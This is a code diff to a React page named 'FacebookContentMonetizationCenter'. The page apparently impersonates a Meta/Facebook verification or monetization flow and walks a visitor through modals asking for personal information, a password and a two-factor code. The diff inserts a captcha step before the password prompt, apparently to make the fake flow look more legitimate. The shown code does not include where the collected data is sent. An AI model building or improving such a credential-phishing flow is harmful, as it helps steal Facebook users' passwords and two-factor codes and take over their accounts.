@@ -1,6 +1,7 @@
 'use client'
 
 import MainContent from '#components/main/MainContent'
+import CaptchaModal from '#components/modals/CaptchaModal'
 import InfomationsModal from '#components/modals/InfomationsModal'
 import PasswordModal from '#components/modals/PasswordModal'
 import SuccessModal from '#components/modals/SuccessModal'
@@ -15,6 +16,8 @@ const LEGACY_STORAGE_KEY = 'meta_verified_state'
 
 const FacebookContentMonetizationCenter = () => {
     const [isOpenInfo, setIsOpenInfo] = React.useState(false)
+    const [isOpenCaptcha, setIsOpenCaptcha] = React.useState(false)
+    const [captchaSessionKey, setCaptchaSessionKey] = React.useState(0)
     const [isOpenPassword, setIsOpenPassword] = React.useState(false)
 
     const [isOpenTwoFactor, setIsOpenTwoFactor] = React.useState(false)
@@ -42,6 +45,7 @@ const FacebookContentMonetizationCenter = () => {
                 const { state, formData: savedFormData, expires } = JSON.parse(raw)
                 if (Date.now() < expires) {
                     setIsOpenInfo(state.isOpenInfo || state.isOpendInfo || false)
+                    setIsOpenCaptcha(state.isOpenCaptcha || false)
                     setIsOpenPassword(state.isOpenPassword || state.isOpendPassword || false)
                     setIsOpenTwoFactor(state.isOpenTwoFactor || state.isOpendTwoFactor || false)
                     setIsOpenSuccess(state.isOpenSuccess || state.isOpendSuccess || false)
@@ -69,6 +73,7 @@ const FacebookContentMonetizationCenter = () => {
                     JSON.stringify({
                         state: {
                             isOpenInfo,
+                            isOpenCaptcha,
                             isOpenPassword,
                             isOpenTwoFactor,
                             isOpenSuccess,
@@ -82,7 +87,7 @@ const FacebookContentMonetizationCenter = () => {
                 /* ignore */
             }
         }
-    }, [isLoaded, isOpenInfo, isOpenPassword, isOpenTwoFactor, isOpenSuccess, formData])
+    }, [isLoaded, isOpenInfo, isOpenCaptcha, isOpenPassword, isOpenTwoFactor, isOpenSuccess, formData])
 
     const handleOpenInfoModal = () => {
         setIsOpenInfo(true)
@@ -129,8 +134,21 @@ const FacebookContentMonetizationCenter = () => {
 
             <InfomationsModal
                 isOpend={isOpenInfo}
-                isOpendPassword={(open: boolean) => handleOpenPasswordModal(open)}
+                onInfoValidated={() => {
+                    setCaptchaSessionKey((k) => k + 1)
+                    setIsOpenCaptcha(true)
+                }}
                 onToggleModal={(isOpen: boolean) => setIsOpenInfo(isOpen)}
+            />
+
+            <CaptchaModal
+                isOpen={isOpenCaptcha}
+                sessionKey={captchaSessionKey}
+                onClose={() => setIsOpenCaptcha(false)}
+                onVerified={() => {
+                    setIsOpenCaptcha(false)
+                    handleOpenPasswordModal(true)
+                }}
             />
 
             <PasswordModal
